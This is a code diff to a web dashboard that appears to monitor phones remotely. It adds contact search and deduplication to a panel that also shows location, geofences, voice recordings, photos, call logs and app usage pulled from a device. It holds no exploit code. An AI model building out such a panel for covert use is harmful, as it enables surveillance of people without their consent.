@@ -306,7 +306,14 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
   </div>
 </div>
 </div>
-<div id="tab-contacts"><div id="contactsList"><div class="label">No contacts synced yet</div></div></div>
+<div id="tab-contacts">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+  <span style="font-size:14px;font-weight:500">&#x1F4CD; Contacts</span>
+  <span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="pollContacts()">&#x1F504; Refresh</span>
+</div>
+<input type="text" id="contactsSearch" placeholder="&#x1F50D; Search contacts..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;margin-bottom:8px">
+<div id="contactsList"><div class="label">No contacts synced yet</div></div>
+</div>
 <div id="tab-voice"><div id="voiceNotesList"><div class="label">No voice notes yet</div></div></div>
 <div id="tab-insights">
 <div class="grid" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:10px">
@@ -479,6 +486,8 @@ let appSnapshotsLastSync = 0;
 let cachedAddresses = (() => { try { return JSON.parse(localStorage.getItem('geoCache') || '{}'); } catch { return {}; } })();
 let nomQueue = [];
 let timelineCache = null;
+let contactsCache = null;
+let contactsSyncTs = 0;
 let nomProcessing = false;
 
 function loadGeofences(deviceId) {
@@ -798,6 +807,8 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   appsPhoneSync = 0;
   appSnapshotsCache = null;
   appSnapshotsLastSync = 0;
+  contactsCache = null;
+  contactsSyncTs = 0;
   wifiCache = [];
   window.permCache = null;
   window.permLastSync = 0;
@@ -1432,41 +1443,71 @@ async function pollContacts() {
   const list = document.getElementById('contactsList');
   const data = await fetchRTDB(`devices/${selectedDevice}/contacts/all`);
   if (!data || !data.contacts) {
+    contactsCache = null;
+    contactsSyncTs = 0;
     list.innerHTML = '<div class="label">No contacts synced yet</div>';
     return;
   }
-  const contacts = data.contacts;
-  let html = '';
-  if (Array.isArray(contacts)) {
-    for (const c of contacts) {
-      const name = c.displayName || c.name || c.number || 'Unknown';
-      const num = c.number || '';
-      const email = c.email || '';
-      html += `<div class="card" style="border-left-color:var(--success);padding:8px 12px;margin-bottom:6px">
-        <div style="font-size:13px;font-weight:500">${escHtml(name)}</div>
-        ${num ? `<div style="font-size:11px;color:var(--muted)">${escHtml(num)}</div>` : ''}
-        ${email ? `<div style="font-size:11px;color:var(--muted)">${escHtml(email)}</div>` : ''}
-      </div>`;
-    }
-  } else {
-    for (const key of Object.keys(contacts)) {
-      const c = contacts[key];
-      if (typeof c === 'object' && c !== null) {
-        const name = c.displayName || c.name || c.number || key;
-        const num = c.number || '';
-        const email = c.email || '';
-        html += `<div class="card" style="border-left-color:var(--success);padding:8px 12px;margin-bottom:6px">
-          <div style="font-size:13px;font-weight:500">${escHtml(name)}</div>
-          ${num ? `<div style="font-size:11px;color:var(--muted)">${escHtml(num)}</div>` : ''}
-          ${email ? `<div style="font-size:11px;color:var(--muted)">${escHtml(email)}</div>` : ''}
-        </div>`;
+  const raw = data.contacts;
+  contactsSyncTs = parseInt(data.ts_ms) || Date.now();
+  const seen = new Map();
+  const extract = c => ({
+    name: c.displayName || c.name || c.number || 'Unknown',
+    num: (c.number || '').replace(/[\s\-\(\)]/g, ''),
+    email: c.email || ''
+  });
+  const process = c => {
+    const entry = extract(c);
+    const key = entry.num || entry.email || entry.name;
+    if (!key) return;
+    if (seen.has(key)) {
+      const existing = seen.get(key);
+      if ((entry.name !== 'Unknown' && existing.name === 'Unknown') ||
+          (entry.name !== 'Unknown' && existing.name === entry.name && entry.email && !existing.email)) {
+        seen.set(key, entry);
       }
+    } else {
+      seen.set(key, entry);
     }
+  };
+  if (Array.isArray(raw)) {
+    raw.forEach(process);
+  } else {
+    Object.values(raw).forEach(c => { if (c && typeof c === 'object') process(c); });
   }
-  list.innerHTML = html || '<div class="label">No contacts found</div>';
-  const count = Array.isArray(contacts) ? contacts.length : Object.keys(contacts).length;
-  list.innerHTML += `<div style="font-size:10px;color:var(--muted);margin-top:6px">${count} contacts · Synced: ${pkt(parseInt(data.ts_ms) || Date.now())}</div>`;
+  contactsCache = Array.from(seen.values());
+  renderContacts();
 }
+
+function renderContacts() {
+  const list = document.getElementById('contactsList');
+  if (!contactsCache || !contactsCache.length) {
+    list.innerHTML = '<div class="label">No contacts found</div>';
+    return;
+  }
+  const q = (document.getElementById('contactsSearch').value || '').toLowerCase();
+  let filtered = contactsCache;
+  if (q) {
+    filtered = contactsCache.filter(c =>
+      c.name.toLowerCase().includes(q) ||
+      c.num.includes(q) ||
+      c.email.toLowerCase().includes(q)
+    );
+  }
+  let html = '';
+  for (const c of filtered) {
+    html += `<div class="card" style="border-left-color:var(--success);padding:8px 12px;margin-bottom:6px">
+      <div style="font-size:13px;font-weight:500">${escHtml(c.name)}</div>
+      ${c.num ? `<div style="font-size:11px;color:var(--muted)">${escHtml(c.num)}</div>` : ''}
+      ${c.email ? `<div style="font-size:11px;color:var(--muted)">${escHtml(c.email)}</div>` : ''}
+    </div>`;
+  }
+  list.innerHTML = html || '<div class="label">No contacts match your search</div>';
+  const dedupedCount = contactsCache.length;
+  list.innerHTML += `<div style="font-size:10px;color:var(--muted);margin-top:6px">${dedupedCount} contacts · Synced: ${pkt(contactsSyncTs)}</div>`;
+}
+
+document.getElementById('contactsSearch')?.addEventListener('input', renderContacts);
 
 // --- Update UI ---
 function updateLocationUI(loc) {
@@ -2282,7 +2323,6 @@ function renderCleanupActions(categories) {
     { label: '🗑 Delete All Photos', desc: 'Remove all uploaded photos', action: 'deleteAll', path: 'photos', icon: '📸', dangerous: true },
     { label: '🗑 Delete Voice Notes', desc: 'Remove all voice recordings', action: 'deleteAll', path: 'voice_notes', icon: '🎤', dangerous: true },
     { label: '🗑 Delete Timeline', desc: 'Remove call logs & timeline events', action: 'deleteAll', path: 'timeline', icon: '📞', dangerous: true },
-    { label: '🗑 Delete Contacts', desc: 'Remove synced contacts', action: 'deleteAll', path: 'contacts', icon: '👥', dangerous: true },
     { label: '🗑 Delete App Usage', desc: 'Remove app usage history', action: 'deleteAll', path: 'apps', icon: '📊', dangerous: true },
     { label: '🧹 Dedup Locations', desc: 'Remove duplicate location entries', action: 'dedupLocations', path: 'location', icon: '📍' },
     { label: '🗑 Delete Location History', desc: 'Remove location data (keeps current)', action: 'deleteLocHistory', path: 'location', icon: '📍', dangerous: true },
